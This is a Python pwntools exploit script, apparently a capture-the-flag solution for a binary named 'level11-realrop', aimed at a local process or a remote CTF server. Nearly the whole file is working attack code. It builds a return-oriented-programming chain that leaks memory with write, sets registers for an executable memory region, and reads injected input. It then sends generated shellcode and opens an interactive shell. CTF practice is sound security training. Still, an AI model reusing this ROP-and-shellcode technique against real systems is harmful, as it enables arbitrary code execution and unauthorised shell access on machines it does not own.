#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./level11-realrop"
elf=ELF(pwn_file)
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team",22011)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.add)
    pause()

inject_pos = 0x8048000
run_pos = inject_pos + 0x500

ebx_val = inject_pos
ecx_val = 0x1000
edx_val = 7
# read-->eax ; stack buff ; ris_jump;  read sh ; jump to it  
read_func = 0x80480FD
ris_jump  = 0x8048102
next_jump = 0x8048198
write_func = 0x8048115
pudlen= 0x20-3*4

payload =  'a'*0x10 
payload+=  p32(write_func) + p32(next_jump)
payload+=  p32(1) + p32(0x8048000) + p32(125) + 'a'*pudlen
payload+=  p32(ris_jump)+ p32(next_jump) 
payload+=  p32(ebx_val) + p32(ecx_val) + p32(edx_val) + 'a'*pudlen
payload+=  p32(read_func) + p32(run_pos)
payload+=  p32(0) + p32(run_pos) + p32(0x80)

print len(payload)
r.recv()
r.sendline(payload)
r.recv()

#r.sendline('a'*124)

sh = asm(shellcraft.sh())
r.sendline(sh)
print sh
r.interactive()
